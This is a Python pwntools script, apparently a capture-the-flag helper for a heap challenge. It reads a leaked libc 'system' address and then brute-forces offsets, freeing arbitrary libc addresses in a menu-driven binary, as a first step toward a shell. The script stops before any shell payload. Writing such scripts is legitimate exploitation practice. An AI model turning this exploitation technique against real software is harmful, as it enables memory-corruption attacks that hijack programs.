import argparse
import random
from pwn import *

parser = argparse.ArgumentParser()

parser.add_argument('-d', '--debugger', action='store_true')
parser.add_argument('-r', '--remote')
parser.add_argument('-p', '--port')
parser.add_argument('-e', '--elf')
parser.add_argument('-b', '--binary')
parser.add_argument('-s', '--start', type=lambda i: int(i, 16))
args = parser.parse_args()

context.terminal = '/bin/bash'
# context.log_level = 'debug'# this is a brute wew
# context.binary = args.binary # this just hangs???


p = None # this is global process variable
e = None
env = None
b = None

if args.elf:
  e = ELF(args.elf)
  # env = {"LD_PRELOAD": os.path.join(os.getcwd(), args.elf)}

def get_libc():
  p.recvuntil('system ')
  libc_leak = int(p.recvuntil('\n').strip('\n'), 16)
  return libc_leak - e.symbols['system']

def eat_menu():
  p.recvuntil('Your choice: ')

def malloc(size):
  eat_menu()
  p.sendline(str(1))
  p.recvuntil('many: ')
  p.sendline(str(size))

def free(offset):
  eat_menu()
  p.sendline(str(2))
  p.recvuntil("free: ")
  p.sendline(str(offset))

def read(data):
  eat_menu()
  p.sendline(str(3))
  p.recvuntil('in: ')
  p.send(data)

# find an offset to free at:
offset = 0
start = args.start
for i in range(0, 0x222000, 0x1):
  p = process(args.binary, env=env)
  offset = start + i
  libc_base = get_libc()
  print('Libc is at: ' + hex(libc_base))
  print('Offset is :' + hex(offset))
  print('Freeing at:' + hex(offset + libc_base))
  free(libc_base + offset)

  try:
    error = p.recvline()
    print(error)
    error = p.recvline()
    print(error)
    p.sendline('3')
    print p.recv(1024)
    if '():' in error:
      p.close()
      continue
  except KeyboardInterrupt:
    exit()
  except:
    p.close()
    continue

  break # we found what we needed! now lets use it to get shell

print("Offset: " + hex(offset))
pause()